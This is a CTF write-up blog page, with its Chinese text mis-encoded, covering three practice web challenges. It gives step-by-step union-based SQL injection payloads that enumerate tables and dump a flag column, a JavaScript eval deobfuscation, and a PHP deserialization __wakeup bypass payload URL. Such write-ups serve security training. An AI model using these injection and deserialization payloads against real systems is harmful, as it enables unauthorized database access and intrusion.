<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å‰æˆ‘ä»¬å­¦è¿‡ <span class="title function_ invoke__">substr</span>() å‡½æ•°ï¼Œå®ƒåªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œå¦‚æœè¦åˆ†å‰²çš„ä¸­æ–‡æ–‡å­—åˆ™éœ€è¦ä½¿ç”¨ <span class="title function_ invoke__">mb_substr</span>()ã€‚</span><br><span class="line">å®ä¾‹</span><br><span class="line">ä»å­—ç¬¦ä¸²ä¸­è¿”å› <span class="string">&quot;èœé¸Ÿ&quot;</span>ï¼š</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mb_substr</span>(<span class="string">&quot;èœé¸Ÿæ•™ç¨‹&quot;</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// è¾“å‡ºï¼šèœé¸Ÿ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">----------------</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>()ï¼šè¿”å›è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²åœ¨åˆ«ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span> (haystack ,needle )</span><br><span class="line">haystackï¼šè¦è¢«æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">needleï¼šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">----------------</span><br><span class="line"> in_arrayå‡½æ•°åŠŸèƒ½æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼</span><br></pre></td></tr></table></figure></div>

<h2 id="11-NewsCenter"><a href="#11-NewsCenter" class="headerlink" title="11.NewsCenter"></a>11.NewsCenter</h2><h3 id="1-é¢˜ç›®æè¿°-20"><a href="#1-é¢˜ç›®æè¿°-20" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp-5"><a href="#2ï¼‰wp-5" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¯¥é¢˜è€ƒæŸ¥çš„æ˜¯SQLæ³¨å…¥ï¼Œå¦‚æœä¸æ¸…æ¥šå¼€å§‹çœ‹åˆ°è¾“å…¥æ¡†ï¼Œå°±åº”è¯¥è¯•è¯•å„ç§æ–¹å¼ï¼Œåˆ†æå­˜åœ¨ä»€ä¹ˆæ¼æ´ï¼Œæ¯”å¦‚xssæˆ–sqlç­‰ç­‰</p>
<p>å¼€å§‹å…ˆåˆ¤æ–­sqlæ³¨å…¥å­˜åœ¨</p>
<p>è¾“å…¥**1â€™**ï¼ŒæŠ¥é”™è¿”å›ç©ºç™½é¡µé¢</p>
<p>ç„¶ååˆ¤æ–­å­—æ®µæ•°</p>
<p>å½“è¾“å…¥è¯­å¥ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>è¿”å›ç©ºç™½é¡µé¢ï¼Œäºæ˜¯åˆ¤æ–­å­—æ®µæ•°ä¸º3</p>
<p>ç„¶åè”åˆæ³¨å…¥</p>
<p>å…ˆåˆ¤æ–­æ•°æ®çˆ†å‡ºå£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703204402467.png" alt="image-20220703204402467"></p>
<p>å¾—å‡ºæ•°æ®åœ¨2ï¼Œ3ä½ç½®å¤„è¾“å‡º</p>
<p>ç„¶åæŒ‰ç…§æ ‡å‡†sqlæ³¨å…¥æµç¨‹å³å¯</p>
<p>å…ˆçœ‹æ•°æ®åº“å’Œç‰ˆæœ¬å·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="built_in">version</span>()<span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703204520282.png" alt="image-20220703204520282"></p>
<p>å¾—åˆ°æ•°æ®åº“åä¸º<strong>news</strong>ï¼ŒMySQLç‰ˆæœ¬ä¸º<strong>5.5.61</strong></p>
<p>ç„¶åæŸ¥çœ‹newsåº“çš„è¡¨å</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&quot;news&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703205326915.png" alt="image-20220703205326915"></p>
<p>å¾—åˆ°ä¸¤ä¸ªè¡¨å<strong>news</strong>å’Œ<strong>secret_table</strong></p>
<p>flagè‚¯å®šåœ¨<strong>secret_table</strong>é‡Œ</p>
<p>æŸ¥çœ‹<strong>secret_table</strong>åˆ—</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&quot;secret_table&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703205526044.png" alt="image-20220703205526044"></p>
<p>çœ‹åˆ°fl4gï¼Œå°è¯•æŸ¥çœ‹å…¶æ•°æ®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> fl4g  <span class="keyword">from</span> secret_table),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703205758800.png" alt="image-20220703205758800"></p>
<p>å¾—åˆ°flag</p>
<p>è¿™é‡Œç”¨sqlmapä¹Ÿå¯ä»¥ï¼Œä½†è¿˜æ˜¯è¯•è¯•æ‰‹å·¥æ³¨å…¥æ›´å¥½</p>
<h2 id="12-NaNaNaNNaN-Batman"><a href="#12-NaNaNaNNaN-Batman" class="headerlink" title="12.NaNaNaNNaN-Batman"></a>12.NaNaNaNNaN-Batman</h2><h3 id="1-é¢˜ç›®æè¿°-21"><a href="#1-é¢˜ç›®æè¿°-21" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp-6"><a href="#2ï¼‰wp-6" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¿™ä¸ªå¼€å§‹æœ‰ç‚¹æ‡µï¼Œå€Ÿé‰´äº†å¤§ä½¬çš„wpï¼Œæ‰ç†è§£äº†ä¸€äº›ï¼Œéœ€è¦wpå¯ä»¥è®¤çœŸçœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼Œä»¥ä¸‹åªåŠ ä¸Šä¸ªäººç†è§£å’Œä¸ªäººè®¤ä¸ºæ–‡ç« é‡ç‚¹</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91946853">åŸæ–‡é“¾æ¥</a></p>
<p>jsæºä»£ç åˆ†æï¼š</p>
<p>_ç­‰äºä¸€ä¸ª$å‡½æ•°å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OPENSCAD"><figure class="iseeu highlight /openscad"><table><tr><td class="code"><pre><span class="line">_=&#x27;<span class="function"><span class="keyword">function</span> $<span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>

<p>ä¸€ä¸ªè¾“å…¥æ¡†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">id</span>=<span class="string">&quot;c&quot;</span>&gt;&lt; <span class="attribute">onclick</span>=$()&gt;Ok&lt;/&gt;\&#x27;);</span><br></pre></td></tr></table></figure></div>

<pre><code>***æ ¸å¿ƒä»£ç ï¼š***
evalå‡½æ•°ï¼Œè¿™æ˜¯æ‰§è¡Œå‡½æ•°ï¼›è¿™é‡Œæ‰§è¡Œäº†_å˜é‡ä¸­çš„å†…å®¹ä¹Ÿå°±æ˜¯&#39;&#39;ä¸­çš„å†…å®¹ï¼Œä½†æ˜¯ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰æ‰§è¡Œ$()å‡½æ•°ï¼Œä»…ä»…æ‰§è¡Œäº†å­—ç¬¦ä¸²è€Œå·²ï¼ˆä»è€Œå¯¼è‡´ä¹±ç ï¼‰ï¼Œå› è€Œé¡µé¢htmlé¡µé¢æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåªæ˜¾ç¤ºäº†inputæ ‡ç­¾çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è®©æºä»£ç æ­£å¸¸æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸è¿›è¡Œæ‰§è¡Œï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±ç”¨åˆ°äº†alertå¼¹çª—ï¼ˆå°†evalå‡½æ•°æ”¹ä¸ºalertï¼‰ï¼Œå°†ä¹±ç çš„$()å‡½æ•°æºç å®Œæ•´æ˜¾ç¤ºå‡ºæ¥
è¿™é‡Œå¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œä¹Ÿå¯ä»¥å°†ä¿®æ”¹åçš„æºä»£ç æ”¾å…¥æ§åˆ¶å°æ‰§è¡Œï¼ˆæ”¾å…¥æ§åˆ¶å°éœ€è¦æ³¨æ„åˆ é™¤scriptå‰åæ ‡ç­¾ï¼‰
</code></pre>
<p>æµè§ˆå™¨æ‰“å¼€ï¼š <img src="https://img-blog.csdnimg.cn/20200306183621819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line">function $()&#123;</span><br><span class="line">var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">   if(e.match(/^be0f23/)!=null)</span><br><span class="line">      if(e.match(/233ac/)!=null)</span><br><span class="line">         if(e.match(/e98aa$/)!=null)</span><br><span class="line">             if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">             var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">             var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">             var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">             var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">             var s=[t,n,r,i];</span><br><span class="line">             for(var o=0;o&lt;13;++o)&#123;</span><br><span class="line">             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</span><br><span class="line">             &#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(&#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> Î¿<span class="attr">nclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬çš„ç»ˆæç›®æ ‡æ˜¯æ‰“å°å‡º</p>
<p><code>document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</code></p>
<p>å› æ­¤æˆ‘ä»¬è¦æ»¡è¶³å…³é”®å˜é‡eçš„æ¡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">e.<span class="built_in">length</span>==<span class="number">16</span></span><br><span class="line">e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œåˆç”¨åˆ°äº†æ­£åˆ™è¡¨è¾¾å¼<br><u>^è¡¨ç¤ºå¼€å¤´ä¸€å®šè¦åŒ¹é…åˆ°be0f23ï¼Œ$è¡¨ç¤ºç»“å°¾ä¸€å®šè¦åŒ¹é…åˆ°e98aa</u>ï¼Œå…¶å®ƒçš„åªè¦åŒ¹é…åˆ°å°±å¥½ï¼Œæ²¡æœ‰ä½ç½®è¦æ±‚<br>äºæ˜¯æˆ‘ä»¬æ„é€ eçš„å€¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">e</span><span class="operator">=</span>be0f233ac7be98aa</span><br></pre></td></tr></table></figure></div>

<p>å°†ä¸Šé¢çš„æ ¸å¿ƒä»£ç åç¼€æ”¹ä¸ºhtmlæ ¼å¼ï¼Œæ‰“å¼€å¦‚ä¸‹å›¾æ‰€ç¤º<br>åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°<br>æ¡†ä¸­è¾“å…¥eçš„å€¼<code>be0f233ac7be98aa</code>ï¼Œç‚¹å‡»Okï¼ˆå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨åŸæ¥è·å¾—çš„web100æ–‡ä»¶æµè§ˆå™¨æ‰§è¡Œçš„è¾“å…¥æ¡†ä¸­è¾“å…¥be0f233ac7be98aaï¼‰</p>
<p><img src="https://img-blog.csdnimg.cn/20190624211524604.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><strong>æ³¨1ï¼šå½“ç„¶ï¼Œå¦‚æœå¤§å®¶è§‰å¾—æ„é€ éº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œè·å–flagçš„æ ¸å¿ƒä»£ç ï¼Œä»£ç å¦‚ä¸‹</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> s=[t,n,r,i];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="variable language_">document</span>.<span class="title function_">write</span>(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">document.write(<span class="regexp">s[o%4][0]</span>);s[o%4].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="regexp">//</span>è¾“å‡ºfl;éšååˆ é™¤fl</span><br><span class="line">/*</span><br><span class="line">ä»£ç è¿è¡Œè¯¦è§£ï¼š</span><br><span class="line">ç¬¬ä¸€æ­¥ï¼šdocument.write(<span class="regexp">s[0][0]</span>);s[<span class="number">0</span>].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">ç¬¬äºŒæ­¥ï¼šdocument.write(t[<span class="number">0</span>]);t.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">ç¬¬ä¸‰æ­¥ï¼šdocument.write(<span class="string">&quot;fl&quot;</span>);åˆ é™¤t[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>]ä¸­ç¬¬ä¸€ä¸ªä½ç½®ï¼Œä¸€ä¸ªé¡¹ç›®ï¼Œå³åˆ é™¤fl</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">document.writeçš„åŠŸèƒ½å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_34986769/</span>article<span class="regexp">/details/</span><span class="number">52160532</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">splice</span><span class="params">()</span></span> æ–¹æ³•å‘/ä»æ•°ç»„ä¸­æ·»åŠ /åˆ é™¤é¡¹ç›®ï¼Œç„¶åè¿”å›è¢«åˆ é™¤çš„é¡¹ç›®ã€‚</span><br><span class="line">æ³¨é‡Šï¼šè¯¥æ–¹æ³•ä¼šæ”¹å˜åŸå§‹æ•°ç»„ã€‚</span><br><span class="line">è¯­æ³•</span><br><span class="line">arrayObject<span class="selector-class">.splice</span>(index,howmany,item1,.....,itemX)</span><br><span class="line">å‚æ•°	                         æè¿°</span><br><span class="line">index	                     å¿…éœ€ã€‚æ•´æ•°ï¼Œè§„å®šæ·»åŠ /åˆ é™¤é¡¹ç›®çš„ä½ç½®ï¼Œä½¿ç”¨è´Ÿæ•°å¯ä»æ•°ç»„ç»“å°¾å¤„è§„å®šä½ç½®ã€‚</span><br><span class="line">howmany	                     å¿…éœ€ã€‚è¦åˆ é™¤çš„é¡¹ç›®æ•°é‡ã€‚å¦‚æœè®¾ç½®ä¸º <span class="number">0</span>ï¼Œåˆ™ä¸ä¼šåˆ é™¤é¡¹ç›®ã€‚</span><br><span class="line">item1, ..., itemX	         å¯é€‰ã€‚å‘æ•°ç»„æ·»åŠ çš„æ–°é¡¹ç›®ã€‚</span><br></pre></td></tr></table></figure></div>

<h2 id="13-unserialize3"><a href="#13-unserialize3" class="headerlink" title="13.unserialize3"></a>13.unserialize3</h2><h3 id="1-é¢˜ç›®æè¿°-22"><a href="#1-é¢˜ç›®æè¿°-22" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp-7"><a href="#2ï¼‰wp-7" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¿™é“é¢˜éœ€è¦äº†è§£<a href="../../../../2022/05/28/Web-study">phpååºåˆ—åŒ–</a>ä¸­__wakeupæ¼æ´çš„åˆ©ç”¨,è¿˜æœ‰<a href="../../../../2022/05/28/Web-study">phpé­”æœ¯æ–¹æ³•</a></p>
<p><code>__wakeup()å‡½æ•°æ¼æ´åŸç†ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</code></p>
<p>å¼€å§‹çš„ä»£ç ä¸å®Œæ•´ï¼Œæ˜¯ä¸€æ®µæ®‹ç¼ºçš„PHPä»£ç ï¼Œæ ¹æ®é¢˜ç›®åå­—çŸ¥é“è¿™æ˜¯ç»™ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œ?code=å¯èƒ½æ˜¯æé†’éœ€è¦åœ¨urlåˆ©ç”¨ä»¥GETæ–¹å¼æäº¤codeå€¼</p>
<p><img src="https://img-blog.csdnimg.cn/669297deb27d4dce9bbdac477d78c6b7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ä¸‹æ–¹æ˜¯æŠŠä»£ç è¡¥å……å®Œå–„åï¼Œå¹¶å¹¶è°ƒç”¨åºåˆ—åŒ–å‡½æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                        <span class="comment">//å®šä¹‰ä¸€ä¸ªåä¸ºxctfçš„ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;       <span class="comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»å±æ€§$flagï¼Œå€¼ä¸º111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;                                </span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»æ–¹æ³•__wakeup()ï¼Œè¾“å‡ºbad requestsåé€€å‡ºå½“å‰è„šæœ¬</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();    </span><br><span class="line"><span class="comment">//ä½¿ç”¨newè¿ç®—ç¬¦æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼ˆxctfï¼‰çš„å¯¹è±¡ä¸º</span></span><br><span class="line"><span class="comment">//è¿™é‡Œä¹Ÿå°±æ˜¯å®šä¹‰äº†äº†ä¸€ä¸ªæ–°çš„ç±»ç”¨æ¥ååºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));       </span><br><span class="line"><span class="comment">//serialize()åºåˆ—åŒ–å‡½æ•°</span></span><br><span class="line"><span class="comment">//è¾“å‡ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œè¯¥phpä»£ç ï¼Œå¾—åˆ°åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220627215806623.png" alt="image-20220627215806623"></p>
<p>å¦‚æœçœ‹ä¸æ‡‚ï¼Œå¯ä»¥çœ‹çœ‹æ–¹ä¾¿ä¸‹å›¾ç†è§£</p>
<p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>è¿™é‡Œå¦‚æœç›´æ¥è®¿é—®ï¼Œä¼šå¤±è´¥</p>
<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220627220136916.png" alt="image-20220627220136916"></p>
<p>å› ä¸ºæˆ‘ä»¬å¿½ç•¥äº†<code>__wakeup()</code>ï¼Œè¿™é‡Œå°±éœ€è¦äº†è§£phpçš„é­”æœ¯æ–¹æ³•å½“ä¸­çš„ç»•è¿‡__wakeup()</p>
<p><code>å¦‚ä½•ç»•è¿‡__wakeup()ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚ä»è€Œç»•è¿‡äº†__wakeup()å‡½æ•°</code></p>
<p>åœ¨è¿™ä¸²åºåˆ—åŒ–çš„ä»£ç ä¸­ï¼Œå¯¹è±¡å±æ€§æ•°ä¸º1ï¼ŒæŠŠä¸‹åˆ—çš„1æ”¹ä¸º2(&gt;1)ï¼Œå³å¯</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>â€“&gt;</p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>ç„¶åpayload:<code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p>å¾—åˆ°flag</p>
<p>è¡¥å……ï¼š</p>
